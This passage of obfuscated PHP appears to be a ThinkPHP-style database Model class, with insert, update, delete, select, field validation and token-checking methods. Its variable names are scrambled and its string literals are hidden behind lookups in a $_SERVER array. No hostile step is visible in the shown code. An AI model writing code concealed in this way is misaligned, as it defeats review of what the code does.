$¿øÊıÓ¼ = call_user_func_array(array($this, $¼•í·çø[355]), array($ÂÙüñæ, $­ØŒˆó, $ÄÕø˜£)); if ($¿øÊıÓ¼) { return $¿øÊıÓ¼; } } return $ÄÕø˜£; } protected function _initialize() { } protected function _facade($õı¦š§‡) { $ªÑÅŸÕ˜ =& $_SERVER[÷ôÚîå]; if (!empty($this->fields)) { foreach ($õı¦š§‡ as $­ƒ‚ò¨¤ => $¬Ê°éª©) { if (is_array($this->fields) && !in_array($­ƒ‚ò¨¤, $this->fields, !0)) { unset($õı¦š§‡[$­ƒ‚ò¨¤]); } elseif (is_scalar($¬Ê°éª©)) { $this->_parseType($õı¦š§‡, $­ƒ‚ò¨¤); } } } if (!empty($this->options[$ªÑÅŸÕ˜[356]])) { $õı¦š§‡ = array_map($this->options[$ªÑÅŸÕ˜[356]], $õı¦š§‡); unset($this->options[$ªÑÅŸÕ˜[356]]); } $this->_beforeWrite($õı¦š§‡); return $õı¦š§‡; } protected function _beforeWrite(&$Ø¡‹×ª) { } public function add($¶€Şôï = '', $£¹àï—ü = array(), $Úê„œœ€ = false) { if (empty($¶€Şôï)) { if (!empty($this->data)) { $¶€Şôï = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[÷ôÚîå][357]); return !1; } } $£¹àï—ü = $this->_parseOptions($£¹àï—ü); $¶€Şôï = $this->_facade($¶€Şôï); if (!1 === $this->_beforeInsert($¶€Şôï, $£¹àï—ü)) { return !1; } $ŒóÏŠûİ = $this->db->insert($¶€Şôï, $£¹àï—ü, $Úê„œœ€); if (!1 !== $ŒóÏŠûİ) { $ÕƒªÏ¡» = $this->getLastInsID(); if ($ÕƒªÏ¡») { $¶€Şôï[$this->getPk()] = $ÕƒªÏ¡»; $this->_after_insert($¶€Şôï, $£¹àï—ü); return $ÕƒªÏ¡»; } $this->_after_insert($¶€Şôï, $£¹àï—ü); } return $ŒóÏŠûİ; } protected function _beforeInsert(&$¼ÎÜöÜà, $³–øÅøş) { } protected function _after_insert($Û‡”Ü†, $î£€ã­Ö) { } public function addAll($ßí¡àöš, $è€’ó™ê = array(), $¢êèÅ›ù = false) { $„ü¸×÷– =& $_SERVER[÷ôÚîå]; if (empty($ßí¡àöš)) { $this->error = think_lang($„ü¸×÷–[357]); return !1; } $è€’ó™ê = $this->_parseOptions($è€’ó™ê); foreach ($ßí¡àöš as $‰À×Û  => $‡ŠáŸÉ) { $ßí¡àöš[$‰À×Û ] = $this->_facade($‡ŠáŸÉ); } if (method_exists($this->db, $„ü¸×÷–[358])) { $”Øğí¾š = $this->db->insertAll($ßí¡àöš, $è€’ó™ê, $¢êèÅ›ù); } else { $this->startTrans(); foreach ($ßí¡àöš as $‰À×Û  => $‡ŠáŸÉ) { $”Øğí¾š = $this->db->insert($‡ŠáŸÉ, $è€’ó™ê, $¢êèÅ›ù); } $this->commit(); } if (!1 !== $”Øğí¾š) { $ƒÌ­é„Š = $this->getLastInsID(); if ($ƒÌ­é„Š) { return $ƒÌ­é„Š; } } return $”Øğí¾š; } public function selectAdd($î¡ÎúºÉ = '', $Ğ¬ª®µ‚ = '', $ûËßãôı = array()) { $úşŠç¤Å =& $_SERVER[÷ôÚîå]; $ûËßãôı = $this->_parseOptions($ûËßãôı); if (!1 === ($¿èí¼•ß = $this->db->selectInsert($î¡ÎúºÉ ? $î¡ÎúºÉ : $ûËßãôı[$úşŠç¤Å[359]], $Ğ¬ª®µ‚ ? $Ğ¬ª®µ‚ : $this->getTableName(), $ûËßãôı))) { $this->error = think_lang($úşŠç¤Å[360]); return !1; } else { return $¿èí¼•ß; } } public function save($ƒî¸Ó¶¹ = '', $·´üÑ€ = array()) { $šÌôéû =& $_SERVER[÷ôÚîå]; if (empty($ƒî¸Ó¶¹)) { if (!empty($this->data)) { $ƒî¸Ó¶¹ = $this->data; $this->data = array(); } else { $this->error = think_lang($šÌôéû[357]); return !1; } } $ƒî¸Ó¶¹ = $this->_facade($ƒî¸Ó¶¹); $·´üÑ€ = $this->_parseOptions($·´üÑ€); $ïÁó‰æï = $this->getPk(); if (!isset($·´üÑ€[$šÌôéû[361]])) { if (isset($ƒî¸Ó¶¹[$ïÁó‰æï])) { $Á¡À×¿ø[$ïÁó‰æï] = $ƒî¸Ó¶¹[$ïÁó‰æï]; $·´üÑ€[$šÌôéû[361]] = $Á¡À×¿ø; unset($ƒî¸Ó¶¹[$ïÁó‰æï]); } else { $this->error = think_lang($šÌôéû[360]); return !1; } } if (is_array($·´üÑ€[$šÌôéû[361]]) && isset($·´üÑ€[$šÌôéû[361]][$ïÁó‰æï])) { $áé˜í¶Ú = $·´üÑ€[$šÌôéû[361]][$ïÁó‰æï]; } if (!1 === $this->_beforeUpdate($ƒî¸Ó¶¹, $·´üÑ€)) { return !1; } $©¾›ƒœ¶ = $this->db->update($ƒî¸Ó¶¹, $·´üÑ€); if (!1 !== $©¾›ƒœ¶) { if (isset($áé˜í¶Ú)) { $ƒî¸Ó¶¹[$ïÁó‰æï] = $áé˜í¶Ú; } $this->_afterUpdate($ƒî¸Ó¶¹, $·´üÑ€); } return $©¾›ƒœ¶; } protected function _beforeUpdate(&$å†ã…ŒÑ, $±ÚŞìà­) { } protected function _afterUpdate($ÌëâÎ°ø, $²Šú†½) { } public function delete($†Ïùã…ù = array()) { $â¸ëËÁ =& $_SERVER[÷ôÚîå]; if (empty($†Ïùã…ù) && empty($this->options[$â¸ëËÁ[361]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $İ‚‹†à° = $this->getPk(); if (is_numeric($†Ïùã…ù) || is_string($†Ïùã…ù)) { if (strpos($†Ïùã…ù, $â¸ëËÁ[50])) { $ïß½Õğ[$İ‚‹†à°] = array($â¸ëËÁ[362], $†Ïùã…ù); } else { $ïß½Õğ[$İ‚‹†à°] = $†Ïùã…ù; } $this->options[$â¸ëËÁ[361]] = $ïß½Õğ; } $†Ïùã…ù = $this->_parseOptions(); if (is_array($†Ïùã…ù[$â¸ëËÁ[361]]) && isset($†Ïùã…ù[$â¸ëËÁ[361]][$İ‚‹†à°])) { $¨ì·¼ÉÕ = $†Ïùã…ù[$â¸ëËÁ[361]][$İ‚‹†à°]; } $÷Ğ‡°¤÷ = $this->db->delete($†Ïùã…ù); if (!1 !== $÷Ğ‡°¤÷) { $–“ÕÅ§æ = array(); if (isset($¨ì·¼ÉÕ)) { $–“ÕÅ§æ[$İ‚‹†à°] = $¨ì·¼ÉÕ; } $this->_after_delete($–“ÕÅ§æ, $†Ïùã…ù); } return $÷Ğ‡°¤÷; } protected function _after_delete($òâë÷, $Ü³·â¢ã) { } public function select($å„öÓ›„ = array()) { $ã¿™œ² =& $_SERVER[÷ôÚîå]; if (is_string($å„öÓ›„) || is_numeric($å„öÓ›„)) { $¥ñšá« = $this->getPk(); if (strpos($å„öÓ›„, $ã¿™œ²[50])) { $Ä¨ı”[$¥ñšá«] = array($ã¿™œ²[362], $å„öÓ›„); } else { $Ä¨ı”[$¥ñšá«] = $å„öÓ›„; } $this->options[$ã¿™œ²[361]] = $Ä¨ı”; } elseif (!1 === $å„öÓ›„) { $å„öÓ›„ = $this->_parseOptions(); return $ã¿™œ²[363] . $this->db->buildSelectSql($å„öÓ›„) . $ã¿™œ²[364]; } $å„öÓ›„ = $this->_parseOptions(); $œøÊ×ÏÕ = $this->db->select($å„öÓ›„); if (!1 === $œøÊ×ÏÕ) { return !1; } if (empty($œøÊ×ÏÕ)) { return null; } $this->_afterSelect($œøÊ×ÏÕ, $å„öÓ›„); return $œøÊ×ÏÕ; } protected function _afterSelect(&$¤øóö±–, $ëÉë©¿ú) { } public function buildSql($ìĞªŠÆË = array()) { $¯Ş—Ú¾ =& $_SERVER[÷ôÚîå]; $ìĞªŠÆË = $this->_parseOptions($ìĞªŠÆË); return $¯Ş—Ú¾[363] . $this->db->buildSelectSql($ìĞªŠÆË) . $¯Ş—Ú¾[364]; } public function optionsValue($øŞØ˜Ğå = null) { if (is_null($øŞØ˜Ğå)) { return $this->options; } elseif (is_array($øŞØ˜Ğå)) { $this->options = array_merge($this->options, $øŞØ˜Ğå); } } protected function _parseOptions($§‚’Üï‚ = array()) { $ë³±¬Òç =& $_SERVER[÷ôÚîå]; if (is_array($§‚’Üï‚)) { $§‚’Üï‚ = array_merge($this->options, $§‚’Üï‚); } $this->options = array(); if (!isset($§‚’Üï‚[$ë³±¬Òç[365]])) { $§‚’Üï‚[$ë³±¬Òç[365]] = $this->getTableName(); $‰²öŠ“ó = $this->fields; } else { $‰²öŠ“ó = $this->getDbFields(); } if (!empty($§‚’Üï‚[$ë³±¬Òç[366]])) { $§‚’Üï‚[$ë³±¬Òç[365]] .= $ë³±¬Òç[53] . $§‚’Üï‚[$ë³±¬Òç[366]]; } $§‚’Üï‚[$ë³±¬Òç[367]] = $this->name; if (isset($§‚’Üï‚[$ë³±¬Òç[361]]) && is_array($§‚’Üï‚[$ë³±¬Òç[361]]) && !empty($‰²öŠ“ó) && !isset($§‚’Üï‚[$ë³±¬Òç[368]]) && !isset($§‚’Üï‚[$ë³±¬Òç[365]])) { foreach ($§‚’Üï‚[$ë³±¬Òç[361]] as $¥´“Ğ¼ => $ÚÖ¾¼¤) { $¥´“Ğ¼ = trim($¥´“Ğ¼); if (in_array($¥´“Ğ¼, $‰²öŠ“ó, !0)) { if (is_scalar($ÚÖ¾¼¤)) { $this->_parseType($§‚’Üï‚[$ë³±¬Òç[361]], $¥´“Ğ¼); } } elseif (!is_numeric($¥´“Ğ¼) && $ë³±¬Òç[11] != substr($¥´“Ğ¼, 0, 1) && !1 === strpos($¥´“Ğ¼, $ë³±¬Òç[10]) && !1 === strpos($¥´“Ğ¼, $ë³±¬Òç[346]) && !1 === strpos($¥´“Ğ¼, $ë³±¬Òç[224]) && !1 === strpos($¥´“Ğ¼, $ë³±¬Òç[369])) { unset($§‚’Üï‚[$ë³±¬Òç[361]][$¥´“Ğ¼]); } } } $this->_options_filter($§‚’Üï‚); return $§‚’Üï‚; } protected function _options_filter(&$¼Ù“—ô£) { } protected function _parseType(&$›ûÛ·¸», $şİ³­åµ) { $ÉÇ¡½¨Ò =& $_SERVER[÷ôÚîå]; if (empty($this->options[$ÉÇ¡½¨Ò[370]][$ÉÇ¡½¨Ò[4] . $şİ³­åµ])) { $­ìæÁ½ = strtolower($this->fields[$ÉÇ¡½¨Ò[338]][$şİ³­åµ]); if (!1 !== strpos($­ìæÁ½, $ÉÇ¡½¨Ò[371])) { } elseif (!1 === strpos($­ìæÁ½, $ÉÇ¡½¨Ò[372]) && !1 !== strpos($­ìæÁ½, $ÉÇ¡½¨Ò[373])) { $›ûÛ·¸»[$şİ³­åµ] = intval($›ûÛ·¸»[$şİ³­åµ]); } elseif (!1 !== strpos($­ìæÁ½, $ÉÇ¡½¨Ò[374]) || !1 !== strpos($­ìæÁ½, $ÉÇ¡½¨Ò[375])) { $›ûÛ·¸»[$şİ³­åµ] = floatval($›ûÛ·¸»[$şİ³­åµ]); } elseif (!1 !== strpos($­ìæÁ½, $ÉÇ¡½¨Ò[376])) { $›ûÛ·¸»[$şİ³­åµ] = (bool) $›ûÛ·¸»[$şİ³­åµ]; } } } public function find($˜óÇ€æµ = array()) { $¨¸óƒà =& $_SERVER[÷ôÚîå]; if (is_numeric($˜óÇ€æµ) || is_string($˜óÇ€æµ)) { $¹òÚÙ´î[$this->getPk()] = intval($˜óÇ€æµ); $this->options[$¨¸óƒà[361]] = $¹òÚÙ´î; } $this->options[$¨¸óƒà[377]] = 1; $˜óÇ€æµ = $this->_parseOptions(); $ß‘¿’¡ = $this->db->select($˜óÇ€æµ); if (!1 === $ß‘¿’¡) { return !1; } if (empty($ß‘¿’¡)) { return null; } $this->data = $ß‘¿’¡[0]; $this->_afterFind($this->data, $˜óÇ€æµ); if (!empty($this->options[$¨¸óƒà[378]])) { return $this->returnResult($this->data, $this->options[$¨¸óƒà[378]]); } return $this->data; } protected function _afterFind(&$´Õøï¨, $¸„Ò”£) { } protected function returnResult($­àÔ™èÛ, $ÀØ§¼¥¿ = '') { $‡ë„²å =& $_SERVER[÷ôÚîå]; if ($ÀØ§¼¥¿) { if (is_callable($ÀØ§¼¥¿)) { return call_user_func($ÀØ§¼¥¿, $­àÔ™èÛ); } switch (strtolower($ÀØ§¼¥¿)) { case $‡ë„²å[379]: return json_encode($­àÔ™èÛ); case $‡ë„²å[380]: return xml_encode($­àÔ™èÛ); } } return $­àÔ™èÛ; } public function parseFieldsMap($Ô«¾”¸, $Ë€‘×‚ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Õ«š†£Ö => $ñ™ˆŸÛ¬) { if ($Ë€‘×‚ == 1) { if (isset($Ô«¾”¸[$ñ™ˆŸÛ¬])) { $Ô«¾”¸[$Õ«š†£Ö] = $Ô«¾”¸[$ñ™ˆŸÛ¬]; unset($Ô«¾”¸[$ñ™ˆŸÛ¬]); } } else { if (isset($Ô«¾”¸[$Õ«š†£Ö])) { $Ô«¾”¸[$ñ™ˆŸÛ¬] = $Ô«¾”¸[$Õ«š†£Ö]; unset($Ô«¾”¸[$Õ«š†£Ö]); } } } } return $Ô«¾”¸; } public function setField($¦‘î—µ¡, $×»È¹» = '') { if (is_array($¦‘î—µ¡)) { $ìƒ £­ê = $¦‘î—µ¡; } else { $ìƒ £­ê[$¦‘î—µ¡] = $×»È¹»; } return $this->save($ìƒ £­ê); } public function setAdd($šÆ£á², $Æé±Äò³ = 1) { $òÎÅæ­ =& $_SERVER[÷ôÚîå]; $é¥Ëõ×ı = $šÆ£á² . $òÎÅæ­[381] . $Æé±Äò³; if ($Æé±Äò³ < 0) { $é¥Ëõ×ı = $šÆ£á² . $Æé±Äò³; } return $this->setField($šÆ£á², array($òÎÅæ­[382], $é¥Ëõ×ı)); } public function getField($èˆ¤ê¨ª, $«ÜêÜçÛ = null) { $õì³»¡Ğ =& $_SERVER[÷ôÚîå]; $¨ï†ƒó‰[$õì³»¡Ğ[359]] = $èˆ¤ê¨ª; $¨ï†ƒó‰ = $this->_parseOptions($¨ï†ƒó‰); $èˆ¤ê¨ª = trim($èˆ¤ê¨ª); if (strpos($èˆ¤ê¨ª, $õì³»¡Ğ[50])) { if (!isset($¨ï†ƒó‰[$õì³»¡Ğ[377]])) { $¨ï†ƒó‰[$õì³»¡Ğ[377]] = is_numeric($«ÜêÜçÛ) ? $«ÜêÜçÛ : $õì³»¡Ğ[12]; } $Í«ğÚÓß = $this->db->select($¨ï†ƒó‰); if (!empty($Í«ğÚÓß)) { $ğÌÃì¿â = explode($õì³»¡Ğ[50], $èˆ¤ê¨ª); $èˆ¤ê¨ª = array_keys($Í«ğÚÓß[0]); $óÃÛë˜â = array_shift($èˆ¤ê¨ª); $œÜš„Œã = array_shift($èˆ¤ê¨ª); $¬ª‰å = array(); $Ùé×ŠÊ¦ = count($ğÌÃì¿â); foreach ($Í«ğÚÓß as $¯•Æº–) { $…ãÀ’‰ß = $¯•Æº–[$óÃÛë˜â]; if (2 == $Ùé×ŠÊ¦) { $¬ª‰å[$…ãÀ’‰ß] = $¯•Æº–[$œÜš„Œã]; } else { $¬ª‰å[$…ãÀ’‰ß] = is_string($«ÜêÜçÛ) ? implode($«ÜêÜçÛ, $¯•Æº–) : $¯•Æº–; } } return $¬ª‰å; } } else { if (!0 !== $«ÜêÜçÛ) { $¨ï†ƒó‰[$õì³»¡Ğ[377]] = is_numeric($«ÜêÜçÛ) ? $«ÜêÜçÛ : 1; } if ($«ÜêÜçÛ === $õì³»¡Ğ[341]) { unset($¨ï†ƒó‰[$õì³»¡Ğ[377]]); } $¯•Æº– = $this->db->select($¨ï†ƒó‰); if (!empty($¯•Æº–)) { if ($«ÜêÜçÛ === $õì³»¡Ğ[341]) { return reset($¯•Æº–[0]); } if (!0 !== $«ÜêÜçÛ && 1 == $¨ï†ƒó‰[$õì³»¡Ğ[377]]) { return reset($¯•Æº–[0]); } foreach ($¯•Æº– as $Îí³¢ê) { $¹†ï„ÌÛ[] = $Îí³¢ê[$èˆ¤ê¨ª]; } return $¹†ï„ÌÛ; } } return null; } public function create($ñóÔîÑÙ = '', $¬éƒëˆ = '') { $¨ª¢§üú =& $_SERVER[÷ôÚîå]; if (empty($ñóÔîÑÙ)) { $ñóÔîÑÙ = $_POST; } elseif (is_object($ñóÔîÑÙ)) { $ñóÔîÑÙ = get_object_vars($ñóÔîÑÙ); } if (empty($ñóÔîÑÙ) || !is_array($ñóÔîÑÙ)) { $this->error = think_lang($¨ª¢§üú[357]); return !1; } $ñóÔîÑÙ = $this->parseFieldsMap($ñóÔîÑÙ, 0); $¬éƒëˆ = $¬éƒëˆ ? $¬éƒëˆ : (!empty($ñóÔîÑÙ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¨ª¢§üú[359]])) { $´ê®ÎÈú = $this->options[$¨ª¢§üú[359]]; unset($this->options[$¨ª¢§üú[359]]); } elseif ($¬éƒëˆ == THINK_MODEL_INSERT && isset($this->insertFields)) { $´ê®ÎÈú = $this->insertFields; } elseif ($¬éƒëˆ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $´ê®ÎÈú = $this->updateFields; } if (isset($´ê®ÎÈú)) { if (is_string($´ê®ÎÈú)) { $´ê®ÎÈú = explode($¨ª¢§üú[50], $´ê®ÎÈú); } if (think_config($¨ª¢§üú[383])) { $´ê®ÎÈú[] = think_config($¨ª¢§üú[384]); } foreach ($ñóÔîÑÙ as $¯ÕëÉí => $ÑÆ¦®âã) { if (!in_array($¯ÕëÉí, $´ê®ÎÈú)) { unset($ñóÔîÑÙ[$¯ÕëÉí]); } } } if (!$this->autoValidation($ñóÔîÑÙ, $¬éƒëˆ)) { return !1; } if (!$this->autoCheckToken($ñóÔîÑÙ)) { $this->error = think_lang($¨ª¢§üú[385]); return !1; } if ($this->autoCheckFields) { $´ê®ÎÈú = $this->getDbFields(); foreach ($ñóÔîÑÙ as $¯ÕëÉí => $ÑÆ¦®âã) { if (!in_array($¯ÕëÉí, $´ê®ÎÈú)) { unset($ñóÔîÑÙ[$¯ÕëÉí]); } elseif (MAGIC_QUOTES_GPC && is_string($ÑÆ¦®âã)) { $ñóÔîÑÙ[$¯ÕëÉí] = stripslashes($ÑÆ¦®âã); } } } $this->autoOperation($ñóÔîÑÙ, $¬éƒëˆ); $this->data = $ñóÔîÑÙ; return $ñóÔîÑÙ; } public function autoCheckToken($Ï³”È—–) { $‹¬ÉÃ”ğ =& $_SERVER[÷ôÚîå]; if (isset($this->options[$‹¬ÉÃ”ğ[386]]) && !$this->options[$‹¬ÉÃ”ğ[386]]) { return !0; } if (think_config($‹¬ÉÃ”ğ[383])) { $íğÓ†—Ê = think_config($‹¬ÉÃ”ğ[384]); if (!isset($Ï³”È—–[$íğÓ†—Ê]) || Session::get($íğÓ†—Ê)) { return !1; } list($²²¢íí–, $şç½£à—) = explode($‹¬ÉÃ”ğ[11], $Ï³”È—–[$íğÓ†—Ê]); if ($şç½£à— && Session::get($íğÓ†—Ê . $‹¬ÉÃ”ğ[10] . $²²¢íí–) === $şç½£à—) { Session::remove($íğÓ†—Ê . $‹¬ÉÃ”ğ[10] . $²²¢íí–); return !0; } if (think_config($‹¬ÉÃ”ğ[387])) { Session::remove($íğÓ†—Ê . $‹¬ÉÃ”ğ[10] . $²²¢íí–); } return !1; } return !0; } public function regex($Ï€´°¯í, $ì½°˜„Ñ) { $ÀÕ«š¨û =& $_SERVER[÷ôÚîå]; $°­È˜ñë = array($ÀÕ«š¨û[388] => $ÀÕ«š¨û[389], $ÀÕ«š¨û[390] => $ÀÕ«š¨û[391], $ÀÕ«š¨û[392] => $ÀÕ«š¨û[393], $ÀÕ«š¨û[394] => $ÀÕ«š¨û[395], $ÀÕ«š¨û[396] => $ÀÕ«š¨û[397], $ÀÕ«š¨û[398] => $ÀÕ«š¨û[399], $ÀÕ«š¨û[400] => $ÀÕ«š¨û[401], $ÀÕ«š¨û[375] => $ÀÕ«š¨û[402], $ÀÕ«š¨û[403] => $ÀÕ«š¨û[404]); if (isset($°­È˜ñë[strtolower($ì½°˜„Ñ)])) { $ì½°˜„Ñ = $°­È˜ñë[strtolower($ì½°˜„Ñ)]; } return preg_match($ì½°˜„Ñ, $Ï€´°¯í) === 1; } private function autoOperation(&$îäñÏ– , $°ÓÖ¨Í·) { $ÊÍ¶ÛÑŠ =& $_SERVER[÷ôÚîå]; if (!empty($this->options[$ÊÍ¶ÛÑŠ[405]])) { $‹æÊîËŸ = $this->options[$ÊÍ¶ÛÑŠ[405]]; unset($this->options[$ÊÍ¶ÛÑŠ[405]]); } elseif (!empty($this->_auto)) { $‹æÊîËŸ = $this->_auto; } if (isset($‹æÊîËŸ)) { foreach ($‹æÊîËŸ as $Ô…âÂ¢) { if (empty($Ô…âÂ¢[2])) { $Ô…âÂ¢[2] = THINK_MODEL_INSERT; } if ($°ÓÖ¨Í· == $Ô…âÂ¢[2] || $Ô…âÂ¢[2] == THINK_MODEL_BOTH) { switch (trim($Ô…âÂ¢[3])) { case $ÊÍ¶ÛÑŠ[406]: case $ÊÍ¶ÛÑŠ[407]: $¯¢Íƒ« = isset($Ô…âÂ¢[4]) ? (array) $Ô…âÂ¢[4] : array(); if (isset($îäñÏ– [$Ô…âÂ¢[0]])) { array_unshift($¯¢Íƒ«, $îäñÏ– [$Ô…âÂ¢[0]]); } if ($ÊÍ¶ÛÑŠ[406] == $Ô…âÂ¢[3]) { $îäñÏ– [$Ô…âÂ¢[0]] = call_user_func_array($Ô…âÂ¢[1], $¯¢Íƒ«); } else { $îäñÏ– [$Ô…âÂ¢[0]] = call_user_func_array(array(&$this, $Ô…âÂ¢[1]), $¯¢Íƒ«); } break; case $ÊÍ¶ÛÑŠ[359]: $îäñÏ– [$Ô…âÂ¢[0]] = $îäñÏ– [$Ô…âÂ¢[1]]; break; case $ÊÍ¶ÛÑŠ[408]: if ($ÊÍ¶ÛÑŠ[12] === $îäñÏ– [$Ô…âÂ¢[0]]) { unset($îäñÏ– [$Ô…âÂ¢[0]]); } break; case $ÊÍ¶ÛÑŠ[409]: default: $îäñÏ– [$Ô…âÂ¢[0]] = $Ô…âÂ¢[1]; } if (!1 === $îäñÏ– [$Ô…âÂ¢[0]]) { unset($îäñÏ– [$Ô…âÂ¢[0]]); } } } } return $îäñÏ– ; } protected function autoValidation($Å¼™»Âé, $Í­–Äúş) { $„‹ÑœÖ’ =& $_SERVER[÷ôÚîå]; if (!empty($this->options[$„‹ÑœÖ’[410]])) { $²Ö½¦üÃ = $this->options[$„‹ÑœÖ’[410]]; unset($this->options[$„‹ÑœÖ’[410]]); } elseif (!empty($this->_validate)) { $²Ö½¦üÃ = $this->_validate; } if (isset($²Ö½¦üÃ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($²Ö½¦üÃ as $§½¿Ğ => $Š´ßºÃ) { if (empty($Š´ßºÃ[5]) || $Š´ßºÃ[5] == THINK_MODEL_BOTH || $Š´ßºÃ[5] == $Í­–Äúş) { if (0 == strpos($Š´ßºÃ[2], $„‹ÑœÖ’[411]) && strpos($Š´ßºÃ[2], $„‹ÑœÖ’[412])) { $Š´ßºÃ[2] = think_lang(substr($Š´ßºÃ[2], 2, -1)); } $Š´ßºÃ[3] = isset($Š´ßºÃ[3]) ? $Š´ßºÃ[3] : THINK_EXISTS_VALIDATE; $Š´ßºÃ[4] = isset($Š´ßºÃ[4]) ? $Š´ßºÃ[4] : $„‹ÑœÖ’[413]; switch ($Š´ßºÃ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Å¼™»Âé, $Š´ßºÃ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($„‹ÑœÖ’[12] != trim($Å¼™»Âé[$Š´ßºÃ[0]])) { if (!1 === $this->_validationField($Å¼™»Âé, $Š´ßºÃ)) { return !1; } } break; default: if (isset($Å¼™»Âé[$Š´ßºÃ[0]])) { if (!1 === $this->_validationField($Å¼™»Âé, $Š´ßºÃ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÆæêÃ„ò, $óû€¤Òã) { if (!1 === $this->_validationFieldItem($ÆæêÃ„ò, $óû€¤Òã)) { if ($this->patchValidate) { $this->error[$óû€¤Òã[0]] = $óû€¤Òã[2]; } else { $this->error = $óû€¤Òã[2]; return !1; } } return; } protected function _validationFieldItem($áã”¤ö©, $·­°Ğ…²) { $œ“±šÃò =& $_SERVER[÷ôÚîå]; switch (strtolower(trim($·­°Ğ…²[4]))) { case $œ“±šÃò[406]: case $œ“±šÃò[407]: $£ò–¥ˆ™ = isset($·­°Ğ…²[6]) ? (array) $·­°Ğ…²[6] : array(); if (is_string($·­°Ğ…²[0]) && strpos($·­°Ğ…²[0], $œ“±šÃò[50])) { $·­°Ğ…²[0] = explode($œ“±šÃò[50], $·­°Ğ…²[0]); } if (is_array($·­°Ğ…²[0])) { foreach ($·­°Ğ…²[0] as $Œèæä‰) { $É°ö¨Üø[$Œèæä‰] = $áã”¤ö©[$Œèæä‰]; } array_unshift($£ò–¥ˆ™, $É°ö¨Üø); } else { array_unshift($£ò–¥ˆ™, $áã”¤ö©[$·­°Ğ…²[0]]); } if ($œ“±šÃò[406] == $·­°Ğ…²[4]) { return call_user_func_array($·­°Ğ…²[1], $£ò–¥ˆ™); } else { return call_user_func_array(array(&$this, $·­°Ğ…²[1]), $£ò–¥ˆ™); } case $œ“±šÃò[414]: return $áã”¤ö©[$·­°Ğ…²[0]] == $áã”¤ö©[$·­°Ğ…²[1]]; case $œ“±šÃò[415]: if (is_string($·­°Ğ…²[0]) && strpos($·­°Ğ…²[0], $œ“±šÃò[50])) { $·­°Ğ…²[0] = explode($œ“±šÃò[50], $·­°Ğ…²[0]); } $íï¹¢¦ = array(); if (is_array($·­°Ğ…²[0])) { foreach ($·­°Ğ…²[0] as $Œèæä‰) { $íï¹¢¦[$Œèæä‰] = $áã”¤ö©[$Œèæä‰]; } } else { $íï¹¢¦[$·­°Ğ…²[0]] = $áã”¤ö©[$·­°Ğ…²[0]]; } if (!empty($áã”¤ö©[$this->getPk()])) { $íï¹¢¦[$this->getPk()] = array($œ“±šÃò[416], $áã”¤ö©[$this->getPk()]); } if ($this->where($íï¹¢¦)->find()) { return !1; } return !0; default: return $this->check($áã”¤ö©[$·­°Ğ…²[0]], $·­°Ğ…²[1], $·­°Ğ…²[4]); } } public function check($íû½, $¹¥°±Ÿ, $®öõ…ğŒ = "\x72\x65\147\145\x78") { $ò½—ªø” =& $_SERVER[÷ôÚîå]; $®öõ…ğŒ = strtolower(trim($®öõ…ğŒ)); switch ($®öõ…ğŒ) { case $ò½—ªø”[7]: case $ò½—ªø”[417]: $¥ÁÂ¸É = is_array($¹¥°±Ÿ) ? $¹¥°±Ÿ : explode($ò½—ªø”[50], $¹¥°±Ÿ); return $®öõ…ğŒ == $ò½—ªø”[7] ? in_array($íû½, $¥ÁÂ¸É) : !in_array($íû½, $¥ÁÂ¸É); case $ò½—ªø”[418]: case $ò½—ªø”[419]: if (is_array($¹¥°±Ÿ)) { $øß‚ÍğÊ = $¹¥°±Ÿ[0]; $ïåûÈ = $¹¥°±Ÿ[1]; } else { list($øß‚ÍğÊ, $ïåûÈ) = explode($ò½—ªø”[50], $¹¥°±Ÿ); } return $®öõ…ğŒ == $ò½—ªø”[418] ? $íû½ >= $øß‚ÍğÊ && $íû½ <= $ïåûÈ : $íû½ < $øß‚ÍğÊ || $íû½ > $ïåûÈ; case $ò½—ªø”[420]: case $ò½—ªø”[421]: return $®öõ…ğŒ == $ò½—ªø”[420] ? $íû½ == $¹¥°±Ÿ : $íû½ != $¹¥°±Ÿ; case $ò½—ªø”[422]: $ŸÍ¦¼ş¡ = mb_strlen($íû½, $ò½—ªø”[423]); if (strpos($¹¥°±Ÿ, $ò½—ªø”[50])) { list($øß‚ÍğÊ, $ïåûÈ) = explode($ò½—ªø”[50], $¹¥°±Ÿ); return $ŸÍ¦¼ş¡ >= $øß‚ÍğÊ && $ŸÍ¦¼ş¡ <= $ïåûÈ; } else { return $ŸÍ¦¼ş¡ == $¹¥°±Ÿ; } case $ò½—ªø”[424]: list($òğ‚»»ú, $–›™â‰ç) = explode($ò½—ªø”[50], $¹¥°±Ÿ); if (!is_numeric($òğ‚»»ú)) { $òğ‚»»ú = strtotime($òğ‚»»ú); } if (!is_numeric($–›™â‰ç)) { $–›™â‰ç = strtotime($–›™â‰ç); } return NOW_TIME >= $òğ‚»»ú && NOW_TIME <= $–›™â‰ç; case $ò½—ªø”[425]: return in_array(get_client_ip(), explode($ò½—ªø”[50], $¹¥°±Ÿ)); case $ò½—ªø”[426]: return !in_array(get_client_ip(), explode($ò½—ªø”[50], $¹¥°±Ÿ)); case $ò½—ªø”[413]: default: return $this->regex($íû½, $¹¥°±Ÿ); } } public function query($èãš€…Í, $°‰ùÄ£ô = false) { $øÅˆåÇ³ =& $_SERVER[÷ôÚîå]; if (!is_bool($°‰ùÄ£ô) && !is_array($°‰ùÄ£ô)) { $°‰ùÄ£ô = func_get_args(); array_shift($°‰ùÄ£ô); } $èãš€…Í = str_replace(array($øÅˆåÇ³[65], $øÅˆåÇ³[427]), $øÅˆåÇ³[53], $èãš€…Í); $èãš€…Í = $this->parseSql($èãš€…Í, $°‰ùÄ£ô); return $this->db->query($èãš€…Í); } public function execute($«İÜèç´, $²‹Ù®Ù = false) { if (!is_bool($²‹Ù®Ù) && !is_array($²‹Ù®Ù)) { $²‹Ù®Ù = func_get_args(); array_shift($²‹Ù®Ù); } $«İÜèç´ = $this->parseSql($«İÜèç´, $²‹Ù®Ù); return $this->db->execute($«İÜèç´); } protected function parseSql($³¯Ã‡“ , 